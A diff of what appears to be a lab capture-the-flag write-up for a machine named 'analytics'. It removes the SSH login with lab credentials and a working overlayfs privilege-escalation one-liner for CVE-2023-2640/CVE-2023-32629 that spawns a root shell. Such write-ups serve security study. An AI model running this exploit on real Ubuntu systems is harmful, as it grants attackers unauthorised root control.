@@ -66,32 +66,4 @@ After analyzing the results of `linpeas` script, a plain text of username and pa
 `META_PASS=An4lytics_ds20223#
 `META_USER=metalytics`
 
-!/assets/img/posts/Pasted image 20250817003116.png
-``
-Lets log-in via SSH
-```
-ssh metalytics@10.10.11.233
-Password: An4lytics_ds20223#
-
-cat user.txt
-```
-
-While reviewing the results of `linpeas` again, it was discovered that the machine's version was Ubuntu 22.04.3
-
-!/assets/img/posts/Pasted image 20250817003157.png
-
-After extensive searching on Google, it was determined that the machine's version was susceptible to:
-CVE-2023-2640 and CVE-2023-32629 : https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/
-
-Executing the code
-```
-unshare -rm sh -c "mkdir 1 u w m && cp /u*/b*/p*3 1/; setcap cap_setuid+eip 1/python3;mount -t overlay overlay -o rw,lowerdir=1,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import pty; import os;os.setuid(0); pty.spawn("/bin/bash")'
-```
-
-![1059](/assets/img/posts/Pasted image 20260820103105.png)
-
-Searching for the root flag
-```
-root@analytics:~# cd /root
-cat root.txt
-```
+![](/assets/img/posts/Pasted image 20250817003116.png)
